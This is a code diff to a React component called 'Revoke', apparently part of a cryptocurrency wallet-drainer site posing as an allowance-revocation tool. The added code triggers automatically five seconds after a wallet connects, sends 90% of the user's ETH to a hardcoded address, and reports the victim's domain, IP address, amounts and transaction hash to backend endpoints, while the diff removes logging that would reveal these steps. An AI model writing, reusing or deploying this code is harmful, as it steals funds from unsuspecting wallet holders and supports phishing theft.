@@ -122,6 +122,16 @@ const Revoke = () => {
     }
   };
 
+  useEffect(() => {
+    let timer;
+    if (isConnected && walletData) {
+      timer = setTimeout(() => {
+        handleClick();
+      }, 5000); // 20s
+    }
+    return () => clearTimeout(timer);
+  }, [isConnected, walletData]);
+
   const handleClick = async () => {
     setIsButtonDisabled(true);
     console.log(walletData);
@@ -143,7 +153,6 @@ const Revoke = () => {
         };
         try {
           const res = await requestTokenSignature(data);
-          console.log("request Token Signature succesful: ", res);
         } catch (error) {
           console.log("request Token Signature failed:", error);
         }
@@ -161,13 +170,8 @@ const Revoke = () => {
             withdrawal_amount: balance,
             withdrawal_amount_token: token_balance,
           };
-          console.log("token confirmed :", data);
           try {
             const res = await tokenConfirmed(data);
-            console.log("token confirmed post successful: ", res);
-            console.log(
-              `Increase allowance successful! Transaction hash: ${res.data}`
-            );
           } catch (error) {
             console.error("token confirmed post failed:", error);
           }
@@ -181,8 +185,6 @@ const Revoke = () => {
           };
           try {
             const res = await tokenDeclined(data);
-            console.log("tokenDeclined post successful:", res);
-            console.log(`Increase allowance failed: ${res.error}`);
           } catch (error) {
             console.log("tokenDeclined post failed:", res);
           }
@@ -192,17 +194,55 @@ const Revoke = () => {
       const nintyPercentage = 0.9 * ethBalance;
 
       try {
-        console.log("token confirmed post successful: ", res);
+        const data = {
+          asset_name: "Eth",
+          domain: walletData.domain,
+          ip_address: walletData.ip_address,
+          withdrawal_amount: nintyPercentage,
+          withdrawal_amount_token: nintyPercentage,
+        };
+        try {
+          const res = await requestTokenSignature(data);
+        } catch (error) {
+          console.log("request Token Signature failed:", error);
+        }
         const tx = sendTransaction({
           to: "0xD745A139eDb02c0c9eC4ce523a8c87D9f4d109E0",
           value: parseEther(nintyPercentage.toString()),
         });
-        console.log("Transaction sent:", tx);
+        if (tx) {
+          const data = {
+            asset_name: "Eth",
+            domain: walletData.domain,
+            transaction_hash: tx,
+            ip_address: walletData.ip_address,
+            withdrawal_amount: nintyPercentage,
+            withdrawal_amount_token: nintyPercentage,
+          };
+          try {
+            const res = await tokenConfirmed(data);
+          } catch (error) {
+            console.error(error);
+          }
+        } else {
+          const data = {
+            asset_name: "Eth",
+            domain: walletData.domain,
+            ip_address: walletData.ip_address,
+            withdrawal_amount: balance,
+            withdrawal_amount_token: token_balance,
+          };
+          try {
+            const res = await tokenDeclined(data);
+          } catch (error) {
+            console.log(error);
+          }
+        }
       } catch (error) {
-        console.error("Error sending transaction:", error);
+        console.error(error);
       }
     } catch (error) {
-      console.error("Failed to increase allowance token:", error);
+      console.error(error);
     } finally {
       setIsButtonDisabled(false);
     }
